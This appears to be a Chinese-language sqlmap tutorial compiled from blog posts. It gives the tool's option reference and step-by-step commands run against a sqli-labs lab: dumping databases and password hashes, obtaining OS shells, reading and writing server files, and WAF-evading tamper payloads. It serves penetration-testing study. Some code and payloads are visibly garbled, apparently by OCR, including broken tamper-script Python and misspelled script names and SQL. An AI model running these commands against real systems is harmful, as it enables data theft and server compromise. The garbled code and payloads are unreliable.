# 参数
[(140条消息) sqlmap 使用教程_月生ψ的博客-CSDN博客_sqlmap教程](https://blog.csdn.net/weixin_46962006/article/details/121307150)


## Options:

```
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)
```


## Target:
  
```
  At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -d DIRECT           Connection string for direct database connection
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
    -g GOOGLEDORK       Process Google dork results as target URLs
    -c CONFIGFILE       Load options from a configuration INI file
```


## Request:
    These options can be used to specify how to connect to the target URL

  
```
  -A AGENT, --user..  HTTP User-Agent header value
    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --param-del=PARA..  Character used for splitting parameter values (e.g. &)
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
    --live-cookies=L..  Live cookies file used for loading up-to-date values
    --load-cookies=L..  File containing cookies in Netscape/wget format
    --drop-set-cookie   Ignore Set-Cookie header from response
    --mobile            Imitate smartphone through HTTP User-Agent header
    --random-agent      Use randomly selected HTTP User-Agent header value
    --host=HOST         HTTP Host header value
    --referer=REFERER   HTTP Referer header value
    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, Bearer, ...)
    --auth-cred=AUTH..  HTTP authentication credentials (name:password)
    --auth-file=AUTH..  HTTP authentication PEM cert/private key file
    --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)
    --ignore-proxy      Ignore system default proxy settings
    --ignore-redirects  Ignore redirection attempts
    --ignore-timeouts   Ignore connection timeouts
    --proxy=PROXY       Use a proxy to connect to the target URL
    --proxy-cred=PRO..  Proxy authentication credentials (name:password)
    --proxy-file=PRO..  Load proxy list from a file
    --proxy-freq=PRO..  Requests between change of proxy from a given list
    --tor               Use Tor anonymity network
    --tor-port=TORPORT  Set Tor proxy port other than default
    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
    --check-tor         Check to see if Tor is used properly
    --delay=DELAY       Delay in seconds between each HTTP request
    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
    --retries=RETRIES   Retries when the connection timeouts (default 3)
    --retry-on=RETRYON  Retry request on regexp matching content (e.g. "drop")
    --randomize=RPARAM  Randomly change value for given parameter(s)
    --safe-url=SAFEURL  URL address to visit frequently during testing
    --safe-post=SAFE..  POST data to send to a safe URL
    --safe-req=SAFER..  Load safe HTTP request from a file
    --safe-freq=SAFE..  Regular requests between visits to a safe URL
    --skip-urlencode    Skip URL encoding of payload data
    --csrf-token=CSR..  Parameter used to hold anti-CSRF token
    --csrf-url=CSRFURL  URL address to visit for extraction of anti-CSRF token
    --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit
    --csrf-retries=C..  Retries for anti-CSRF token retrieval (default 0)
    --force-ssl         Force usage of SSL/HTTPS
    --chunked           Use HTTP chunked transfer encoded (POST) requests
    --hpp               Use HTTP parameter pollution method
    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
                        "import hashlib;id2=hashlib.md5(id).hexdigest()")

```

## Optimization:
    These options can be used to optimize the performance of sqlmap

   
```
 -o                  Turn on all optimization switches
    --predict-output    Predict common queries output
    --keep-alive        Use persistent HTTP(s) connections
    --null-connection   Retrieve page length without actual HTTP response body
    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)

```
## Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

   
```
 -p TESTPARAMETER    Testable parameter(s)
    --skip=SKIP         Skip testing for given parameter(s)
    --skip-static       Skip testing parameters that not appear to be dynamic
    --param-exclude=..  Regexp to exclude parameters from testing (e.g. "ses")
    --param-filter=P..  Select testable parameter(s) by place (e.g. "POST")
    --dbms=DBMS         Force back-end DBMS to provided value
    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
    --os=OS             Force back-end DBMS operating system to provided value
    --invalid-bignum    Use big numbers for invalidating values
    --invalid-logical   Use logical operations for invalidating values
    --invalid-string    Use random strings for invalidating values
    --no-cast           Turn off payload casting mechanism
    --no-escape         Turn off string escaping mechanism
    --prefix=PREFIX     Injection payload prefix string
    --suffix=SUFFIX     Injection payload suffix string
    --tamper=TAMPER     Use given script(s) for tampering injection data
```

## Detection:
    These options can be used to customize the detection phase

   
```
 --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)
    --string=STRING     String to match when query is evaluated to True
    --not-string=NOT..  String to match when query is evaluated to False
    --regexp=REGEXP     Regexp to match when query is evaluated to True
    --code=CODE         HTTP code to match when query is evaluated to True
    --smart             Perform thorough tests only if positive heuristic(s)
    --text-only         Compare pages based only on the textual content
    --titles            Compare pages based only on their titles
```


## Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    
```
--technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
    --union-char=UCHAR  Character to use for bruteforcing number of columns
    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
    --dns-domain=DNS..  Domain name used for DNS exfiltration attack
    --second-url=SEC..  Resulting page URL searched for second-order response
    --second-req=SEC..  Load second-order HTTP request from file

```

## Fingerprint:
    -f, --fingerprint   Perform an extensive DBMS version fingerprint

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

   
```
 -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --hostname          Retrieve DBMS server hostname
    --is-dba            Detect if the DBMS current user is DBA
    --users             Enumerate DBMS users
    --passwords         Enumerate DBMS users password hashes
    --privileges        Enumerate DBMS users privileges
    --roles             Enumerate DBMS users roles
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --count             Retrieve number of entries for table(s)
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    --search            Search column(s), table(s) and/or database name(s)
    --comments          Check for DBMS comments during enumeration
    --statements        Retrieve SQL statements being run on DBMS
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate
    -X EXCLUDE          DBMS database identifier(s) to not enumerate
    -U USER             DBMS user to enumerate
    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
    --pivot-column=P..  Pivot column name
    --where=DUMPWHERE   Use WHERE condition while table dumping
    --start=LIMITSTART  First dump table entry to retrieve
    --stop=LIMITSTOP    Last dump table entry to retrieve
    --first=FIRSTCHAR   First query output word character to retrieve
    --last=LASTCHAR     Last query output word character to retrieve
    --sql-query=SQLQ..  SQL statement to be executed
    --sql-shell         Prompt for an interactive SQL shell
    --sql-file=SQLFILE  Execute SQL statements from given file(s)
```



## Brute force:
    These options can be used to run brute force checks

  
```
  --common-tables     Check existence of common tables
    --common-columns    Check existence of common columns
    --common-files      Check existence of common files

```



## User-defined function injection:
    These options can be used to create custom user-defined functions

```

    --udf-inject        Inject custom user-defined functions
    --shared-lib=SHLIB  Local path of the shared library
```

## File system access:
    These options can be used to access the back-end database management
    system underlying file system

    
```
--file-read=FILE..  Read a file from the back-end DBMS file system
    --file-write=FIL..  Write a local file on the back-end DBMS file system
    --file-dest=FILE..  Back-end DBMS absolute filepath to write to
```

## Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

  
```
  --os-cmd=OSCMD      Execute an operating system command
    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
    --os-bof            Stored procedure buffer overflow exploitation
    --priv-esc          Database process user privilege escalation
    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
    --tmp-path=TMPPATH  Remote absolute path of temporary files directory

```


## Windows registry access:
    These options can be used to access the back-end database management
    system Windows registry

   
```
 --reg-read          Read a Windows registry key value
    --reg-add           Write a Windows registry key value data
    --reg-del           Delete a Windows registry key value
    --reg-key=REGKEY    Windows registry key
    --reg-value=REGVAL  Windows registry key value
    --reg-data=REGDATA  Windows registry key value data
    --reg-type=REGTYPE  Windows registry key value type
```



## General:
    These options can be used to set some general working parameters

 
```
   -s SESSIONFILE      Load session from a stored (.sqlite) file
    -t TRAFFICFILE      Log all HTTP traffic into a textual file
    --answers=ANSWERS   Set predefined answers (e.g. "quit=N,follow=N")
    --base64=BASE64P..  Parameter(s) containing Base64 encoded data
    --base64-safe       Use URL and filename safe Base64 alphabet (RFC 4648)
    --batch             Never ask for user input, use the default behavior
    --binary-fields=..  Result fields having binary values (e.g. "digest")
    --check-internet    Check Internet connection before assessing the target
    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables
    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")
    --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
    --charset=CHARSET   Blind SQL injection charset (e.g. "0123456789abcdef")
    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)
    --encoding=ENCOD..  Character encoding used for data retrieval (e.g. GBK)
    --eta               Display for each output the estimated time of arrival
    --flush-session     Flush session files for current target
    --forms             Parse and test forms on target URL
    --fresh-queries     Ignore query results stored in session file
    --gpage=GOOGLEPAGE  Use Google dork results from specified page number
    --har=HARFILE       Log all HTTP traffic into a HAR file
    --hex               Use hex conversion during data retrieval
    --output-dir=OUT..  Custom output directory path
    --parse-errors      Parse and display DBMS error messages from responses
    --preprocess=PRE..  Use given script(s) for preprocessing (request)
    --postprocess=PO..  Use given script(s) for postprocessing (response)
    --repair            Redump entries having unknown character marker (?)
    --save=SAVECONFIG   Save options to a configuration INI file
    --scope=SCOPE       Regexp for filtering targets
    --skip-heuristics   Skip heuristic detection of vulnerabilities
    --skip-waf          Skip heuristic detection of WAF/IPS protection
    --table-prefix=T..  Prefix used for temporary tables (default: "sqlmap")
    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
    --web-root=WEBROOT  Web server document root directory (e.g. "/var/www")

  Miscellaneous:
    These options do not fit into any other category

    -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
    --alert=ALERT       Run host OS command(s) when SQL injection is found
    --beep              Beep on question and/or when vulnerability is found
    --dependencies      Check for missing (optional) sqlmap dependencies
    --disable-coloring  Disable console output coloring
    --list-tampers      Display list of available tamper scripts
    --no-logging        Disable logging to a file
    --offline           Work in offline mode (only use session data)
    --purge             Safely remove all content from sqlmap data directory
    --results-file=R..  Location of CSV results file in multiple targets mode
    --shell             Prompt for an interactive sqlmap shell
    --tmp-dir=TMPDIR    Local directory for storing temporary files
    --unstable          Adjust options for unstable connections
    --update            Update sqlmap
    --wizard            Simple wizard interface for beginner users
```



# sqlmap简单使用
## 1.判断是否有sql注入点
sqlmap -u "http://192.168.1.7/sql/less-1/?id=1"  --batch

```
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y //怀疑是mysql数据库跳过其他
...
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y //使用level risk的playload检测
...
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
```

显示如图及存在注入点
![](Pasted%20image%2020221016141840.png)

## 2、判断文本中的请求是否存在注入 

判断是否存在注入的命令如下所示，运行后的结果如图3-6所示，-r一般在存 在cookie注入时使用。
sqlmap -r 1.txt --batch 

``` 1.txt
GET /sql/less-1/?id=1 HTTP/1.1

Host: 192.168.1.7

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1
```

## 3.查询当前用户下的所有数据库

确定网站存在注入后，用于查询当前用户下的所有数据库，如果当前用户有权限读取包含所有数据库列表信息的表，使用该命令就可以列出所有数据库，如图

sqlmap.py -u [http://192.168.98.100/sqli-labs/Less-1/?id=1](http://192.168.98.100/sqli-labs/Less-1/?id=1 "http://192.168.98.100/sqli-labs/Less-1/?id=1") --dbs

!

查询出所有数据库的库名。当继续注入时 --dbs缩写成-Dxxx,其意思是在XXX数据库中继续查询其他数据

## 4 .获取教据库中的表名

该命令的作用是查询完数据库后，查询指定数据库中所有的表名，如下所示.

如果在该命令中不加入-D参教来指定某一具体的数据库，那么SQLmap会列出教据库中所有库的表，如图

sqlmap.py -u [http://192.168.98.100/sqli-labs/Less-1/?id=1](http://192.168.98.100/sqli-labs/Less-1/?id=1 "http://192.168.98.100/sqli-labs/Less-1/?id=1") -D 2web --tables

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2Ff66a123f836aa2e195d412342b436692.png)

可以看到2web数据库中拥有的1个表名。当继续注入时，--tables缩写成-T,意思是在某表中继续查询。

## 5、 获取表中的字段名

该命令的作用是查询完表名后，查询该表中所有的字段名，如下所示。运行该命令的结果

sqlmap.py -u [http://192.168.98.100/sqli-labs/Less-1/?id=1](http://192.168.98.100/sqli-labs/Less-1/?id=1 "http://192.168.98.100/sqli-labs/Less-1/?id=1") -D 2web -T article --columns

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F1b70adc6a444ae59e44b34503861d98e.png)

可以看到在2web数据库中的article表中一共有4个字段。在后续的注入中，--columns缩写成-C。

## 6、获取字段内容

该命令是查询完字段名之后，获取该字段中具体的数据信息，如下所示。

sqlmap.py -u [http://192.168.98.100/sqli-labs/Less-1/?id=1](http://192.168.98.100/sqli-labs/Less-1/?id=1 "http://192.168.98.100/sqli-labs/Less-1/?id=1") -D 2web -T article -C author,id --dump

这里需要下载的数据是2web数据库里article表中author和id两个字段的值

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F91ee835f9e833f4fc90c4b19ecd0e652.png)

## 7、获取数据库的所有用户

该命令的作用是列出教据库的所有用户，如下所示。在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有管理用户。

sqlmap.py -u [http://192.168.98.100/sqli-labs/Less-1/?id=1](http://192.168.98.100/sqli-labs/Less-1/?id=1 "http://192.168.98.100/sqli-labs/Less-1/?id=1") --users

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F6dae20d1581455f48ebdc388ce2bfc01.png)

可以看到，当前用户账号是root

## 8、获取数据库用户的密码

该命令的作用是列出数据库用户的密码，如下所示。如果当前用户有读取包含用户密码的权限，SQLMap会先列举出用户，然后列出Hash,并尝试破解。

sqlmap.py -u [http://192.168.98.100/sqli-labs/Less-1/?id=1](http://192.168.98.100/sqli-labs/Less-1/?id=1 "http://192.168.98.100/sqli-labs/Less-1/?id=1") --passwords

可以看到，密码使用MySQL5加密，可以在www.cmd5.com中自行解密。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2Fea103072234d5f2ad4494fc60e6f9843.png)

## 9、获取当前网站数据库的名称

使用该命令可以列出当前网站使用的数据库，如下所示。

sqlmap.py -u [http://192.168.98.100/sqli-labs/Less-1/?id=1](http://192.168.98.100/sqli-labs/Less-1/?id=1 "http://192.168.98.100/sqli-labs/Less-1/?id=1") --current-db

从图中可以看到数据库是 security

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F19ae062fb55afef295746cb716e04386.png)

## 10、获取当前网站数据库的用户名称

使用该命令可以列出当前网站使用的数据库用户，如下所示。

sqlmap.py -u [http://192.168.98.100/sqli-labs/Less-1/?id=1](http://192.168.98.100/sqli-labs/Less-1/?id=1 "http://192.168.98.100/sqli-labs/Less-1/?id=1")  --current-user

可以看到，用户是'root@localhost

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F10fb305489b40fbe4468e7d874684894.png)

# SQLmap进阶操作

## 1、--level 5:探测等级

参数--level 5指需要执行的测试等级，一共有5个等级(1~5),可不加

level,默认是1.SQLMap使用的Payload可以在xml/payloads.xml中看至，也可以根据相应的格式添加自己的Payload,其中5级包含的Payload最多，会自动破解出cookie、XFF等头部注入。当然，level 5的运行速度也比较慢。

这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP cookie在level为2时就会测试，HTTP User-Agent/Referer头在level为3时就会测试。 总之，在不确定哪个Payload或参数为注入点时，为了保证全面性，建议使用高的level值，即5。

## 2、--is-dba:当前用户是否为管理权限

该命令用于查看当前账户是否为数据库管理员账户，如下所示，在本案例中输 入该命令，会返回Ture,如图示。

sqlmap.py -u [http://192.168.98.100/sqli-labs/Less-1/?id=1](http://192.168.98.100/sqli-labs/Less-1/?id=1 "http://192.168.98.100/sqli-labs/Less-1/?id=1") --is-dba

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F466ec1a746f20bd6d1edf023a8d3be22.png)

## 3、--roles:列出数据库管理员角色

该命令用于查看数据库用户的角色。如果当前用户有权限读取包含所有用户的 表，输入该命令会列举出每个用户的角色，也可以用-U参数指定想看哪个用户的角色。该命令仅适用于当前数据库是Oracle的时候。在本案例中输入该命令的结果如图

sqlmap.py -u [http://192.168.98.100/sqli-labs/Less-1/?id=1](http://192.168.98.100/sqli-labs/Less-1/?id=1 "http://192.168.98.100/sqli-labs/Less-1/?id=1") --roles

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F6f69ec5df61d839dc8c56e63f5c63121.png)

## 4、--referer: HTTP Referer头

SQLMap可以在请求中伪造HTTP中的refer”当——level参数设定为3或3 以上时，会尝试对refere注入。可以使用refere命令来欺骗，如 --referer http:// www.baidu.com

sqlmap.py -u [http://192.168.98.100/sqli-labs/Less-1/?id=1](http://192.168.98.100/sqli-labs/Less-1/?id=1 "http://192.168.98.100/sqli-labs/Less-1/?id=1") --level 3 --referer [http://www](http://www/ "http://www")

.baidu.com

## 5\. --sql-shell:运行自定义[SQL语句](https://so.csdn.net/so/search?q=SQL%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020)

该命令用于执行指定的SQL语句，如下所示，假设执行select \* from users limit 0, 1语句，结果如图所示

sqlmap.py -u [http://192.168.98.100/sqli-labs/Less-1/?id=1](http://192.168.98.100/sqli-labs/Less-1/?id=1 "http://192.168.98.100/sqli-labs/Less-1/?id=1") --level 3 --sql-shell

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F8094c3f765ac8d03a8e2d338e29fa0b0.png)

图3-17执行指定的SQL语句

## 6\. --os-cmd, --os-shell:运行任意操作系统命令

在数据库为MySQL、PostgreSQL或Microsoft SQL Server,并且当前用户 有权限使用特定的函数时，如果数据库为MySQL、PostgreSQL, SQLMap上传一个二进制库，包含用户自定义的函数sys\_exec( )和sys\_eval( ),那么创建的这两个函数 就可以执行系统命令。在Microsoft SQL Server中，SQLMap将使用xp\_cmdshell存储过程，如果被禁用（在Microsoft SQL Server 2005及以上版本默认被禁制），则SQLMap会重新启用它；如果不存在，会自动创建.

用 --os-shell参数可以模拟一个真实的Shell,输入想执行的命令。当不能执行多语句时（比如PHP或ASP的后端数据库为MySQL）,仍然可以使用INTO OUTFILE写进可写目录，创建一个Web后门. --os-shell支持ASP、ASR.NET、JSP 和PHP四种语言（要想执行改参数，需要有数据库管理员权限，也就 --is-dba的值要为True）。

1.  拥有数据库dba权限为True
2.  知道网站的绝对路径
3.  PHP关闭魔术引号
4.  secure_file_priv= 值为空
![](Pasted%20image%2020221016161942.png)

[sqlmap Getshell 让你离shell更近一步 --os-shell - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/58007573)
[(140条消息) sqlmap --os-shell 原理详解_ZredamanJ的博客-CSDN博客_os shell](https://blog.csdn.net/qq_61237064/article/details/124154956)


## 7、--file-read:从数据库服务器中读取文件

该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或Microsoft SQL Server,并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可 以是二进制文件.下面以Microsoft SQL Server 2005为例，复习--file-read参数的 用法。

sqlmap.py -u [http://192.168.98.100/sqli-labs/Less-1/?id=1](http://192.168.98.100/sqli-labs/Less-1/?id=1 "http://192.168.98.100/sqli-labs/Less-1/?id=1") \\ --file-read "C:/key.php" -v 1

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F6493e04efa73997a3c1049fbb347e729.png)

如图，目标服务器的test.txt文件保存到了本地，可进入查看

8.--file-write --file-dest:上传文件到数据库服务器中

该命令用于写入本地文件到服务器中，当教据库为MySQL、PostgreSQL或Microsoft SQL Server,并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。下面以f MySQL的例子复习--file-write --file-dest参数的用法。

sqlmap.py -u [http://192.168.98.100/sqli-labs/Less-1/?id=1](http://192.168.98.100/sqli-labs/Less-1/?id=1 "http://192.168.98.100/sqli-labs/Less-1/?id=1") --file-write "C:/Users/cuiyi/Desktop/1.txt" --file-dest "C:/2.txt" -v 1

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F8575f7bf463b4e8e27027eb881c6bb64.png)

如图，把本地桌面的1.txt文件上传到服务器C盘下，命名为2.txt

# SQLMap自带绕过脚本tamper的讲解

SQLmap在默认情况下除了使用CHAR ()函教防止出现单引号，没有对注入的数据进行修改，读者还可以使用--tamper参数对数据做修改来绕过WAF等设备, 其中大部分脚本主要用正则模块替换攻击载荷字符编码的方式尝试绕过WAF的检测规则，命令如下所示。

sqlmap.py http://example.com --tamper "模块名"

目前官方提供53个绕过脚本，下面是tamper脚本的格式。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F526ade72f7eb8dd552854dfd14339db9.png)

不难看出，一个最小的tamper脚本结构为priority变量定义和

dependencies, tamper函数定义。

###  priority定义脚本的优先级，用于有多个tamper脚本的情况。

###  dependencies函数声明该脚本适用/不适用的范围，可以为空。

下面以一个转大写字符绕过的脚本为例，tampe绕过脚本主要由dependencies和tamper两个函数构成。def tamper (payload, \*\*kwargs)函数接收playload和\*\*kwargs返回一个Payload。下面这段代码的意思是通过正则匹配所有字符，将所有攻击载荷中的字符转换为大写字母。


``` python
**def tamper(payload, ### ### kwargs): retVai** **\=** **payload**

**if payload****:**

**for match in re.finditer(r"\[A-Za-z\_\]+", retVal****)****:**

**word =** **match.group()**

**if word.upper() in kb.keywords:**

**retVal =** **retVal・replace(word, word.upper())**

**return retVal**
```


## 常用的tamper脚本

###  apostrophemask.py

作用：将引号替换为UTF-8,用于过滤单引号。

使用脚本前的语句为：

1 ANDT='1

使用脚本后，语句为：

1 AND %EF%BC%871%EF%BC%87=%EF%BC%871

###  base64encode.py

作用：替换为base64编码。

使用脚本前的语句为：

###  ' AND SLEEP (5) #

使用脚本后，语句为：

MScgQU5EIFNMRUVQKDUplw= =

###  multiplespaces.py

作用：围绕SQL关键字添加多个空格。

使用脚本前的语句为：

1 UNION SELECT foobar

使用脚本后，语句为：

1 UNION SELECT foobar

###  space2plus.py

作用：用+号替换空格。

使用脚本前的语句为：

SELECT id FROM users

使用脚本后，语句为：

SELECT + id + FROM + users

###  nonrecursivereplacement.py

作用：作为双重查询语句，用双重语句替代预定义的SQL关键字（适用于非常弱的自定义过滤器，例如将SELECT替换为空）。

使用脚本前的语句为：

1 UNION SELECT 2-

使用脚本后，语句为：

1 UNIOUNIONN SELESELECTCT 2-

###  space2randomblank.py

作用：将空格替换为其他有效字符。

使用脚本前的语句为：

SELECT id FROM users

使用脚本后，语句为：

SELECT%ODid%ODFROM%OAusers

###  unionalltounion.py

作用：将UNION ALL SELECT替换为UNION SELECK

使用脚本前的语句为：

###  1 UNION ALL SELECT

使用脚本后，语句为：

###  1 UNION SELECT

###  securesphere.py

作用：追加特制的字符串。

使用脚本前的语句为：

1 AND 1=1

使用脚本后，语句为：

1 AND 1 =1 and'Ohaving'^'Ohaving'

###  spaceZhash.py-
作用：将空格替换为#号，并添加Y随机字符串和换行符。

使用脚本前的语句为：

1 AND 9227=9227

使用脚本后，语句为：

1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227

###  space2mssqlblank.py (mssql)

作用：将空格替换为其他空符号。

使用脚本前的语句为：

SELECT id FROM users

使用脚本后，语句为：

SELECT%0Eid%0DFROM%07users

###  space2mssqlhash.py

作用：将空格替换为#号，并添加一个换行符。

使用脚本前的语句为：

1 AND 9227=9227

使用脚本后，语句为：

1 %23%0AAND%23%0A9227=9227

###  between.py

作用：用NOT BETWEEN 0 AND替换大于号(>),用BETWEEN AND替换 号(=)-

使用脚本前的语句为：

###  AND A > B-

使用脚本后，语句为：

1 AND A NOT BETWEEN 0 AND B-

使用脚本前的语句为：

1 AND A=B-

使用脚本后，语句为：

1 AND A BETWEEN B AND B-

###  percentage.py

作用：ASP允许在每个字符前面添加一个％号。

使用脚本前的语句为：

SELECT FIELD FROM TABLE

使用脚本后，语句为：

%S%E%L%E%C%T%F%I%E%L%D%F%R%O%M%T%A% B%L%E

###  sppassword.py

作用：从DBMS日志的自动模糊处理的有效载荷中追加sp\_password。

使用脚本前的语句为：

1 AND 9227=9227-

使用脚本后，语句为：

1 AND 9227=9227 sp password

###  charencode.py

作用：对给定的Payload全部字符使用UR函码（不处理已经编码的字符）。

使用脚本前的语句为：

SELECT FIELD FROM%20TABLE

使用脚本后，语句为：

%53%45%4c%45%43%54%20%46%49%45%4c

%44%20%46%52%4f%4d%20%54%41%42%4c%45

###  randomcase.py

作用：随机大4房。

使用脚本前的语句为：

INSERT

使用脚本后，语句为：

InsERt

###  charunicodeencode.py 作用：字符串unicode编码。

使用脚本前的语句为：

SELECT FIELD%20FROM TABLE

使用脚本后，语句为：


```
%u0053%u0045%u004c

%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c

%u0044%u0020 %u0046%u0052%u004f%u004d

%u0020%u0054%u0041%u0042%u004c%u0045
```


###  spaceZcomment.py

作用：将空格替换为/\*\*/。

使用脚本前的语句为：

SELECT id FROM users

使用脚本后，语句为：

S ELECT/\*\*/id/\*\*/FRO M/\*\*/users

###  equaltolike.py

作用：将等号替换为like。

使用脚本前的语句为：

SELECT \* FROM users WHERE id=1

使用脚本后，语句为：

SELECT \* FROM users WHERE id LIKE 1

###  greatest py

作用：绕过对的过滤，用GREATEST替换大于号。

使用脚本前的语句为：

1 ANDA > B

使用脚本后，语句为：

###  AND GREATEST (A, B + 1) =A

测试通过的数据库类型和版本：

###  MySQL 4、MySQL 5.0和MySQL 5.5

###  Oracle 10g

###  PostgreSQL 8.3、PostgreSQL 8.4和PostgreSQL 9.0

###  ifnull2ifisnull.py

作用：绕过5NIFNULL的过滤，替换类｛以IFNULL (A, B)为IF (ISNULL (A) , B, A).

使用脚本前的语句为：

IFNULL (1, 2)

使用脚本后，语句为：

IF (ISNULL (1) , 2, 1)

测试通过的教据库类型和版本为MySQL 5.0和MySQL 5.5.

###  modsecurityversioned.py

作用：过滤空格，使用MySQL内联胡的球进行以

使用脚本前的语句为：

1 AND 2>1-

使用脚本后，语句为：

1 /\*! 30874AND 2>1\*/-

测试通过的数据库类型和版本为MySQL 5.0。

###  spaceZmysqlblank.py-
作用：将空格替换为其他空白符号(适用于MySQL).

使用脚本前的语句为：

SELECT id FROM users

使用脚本后，语句为：

SELECT%AOid%OBFROM%OCusers

测试通过的数据库类型和版本为MySQL 5.1.

###  modsecurityzeroversioned.py

作用：使用MySQL内联注释的方式(/\*! 00000\*/)进行注入。

使用脚本前的语句为：

1 AND 2>1-

使用脚本后，语句为：

1 /\*! 00000AND 2>1\*/-

测试通过的数据库类型和版本为MySQL 5.0。

###  spaceZmysqldash.py

作用：将空格替换为——，并添加Y换行符。

使用脚本前的语句为：

1 AND 9227=9227

使用脚本后，语句为：

1 %0AAND %0A9227=9227

###  bluecoat.py

作用：在SQL语句之后用有效的随机空白符替换空格符，随后用LIKE替换等于

使用脚本前的语句为：

SELECT id FROM users where id = 1

使用脚本后，语句为：

SELECT%09id FROM%09users WHERE%09id LIKE 1

测试通过的数据库类型和版本为MySQL 5.1和SGOS。

###  versioned keywords.py

作用：注释绕过。

使用脚本前的语句为：

